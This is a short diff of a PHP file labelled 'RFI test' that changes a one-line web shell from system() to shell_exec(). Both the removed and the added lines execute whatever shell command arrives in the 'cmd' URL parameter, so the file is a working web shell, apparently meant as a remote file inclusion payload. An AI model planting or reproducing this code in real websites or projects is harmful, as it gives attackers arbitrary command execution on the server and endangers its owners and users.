@@ -1,4 +1,4 @@
 // RFI test
 <?php
-  system($_GET["cmd"]);
+  shell_exec($_GET["cmd"]);
 ?>
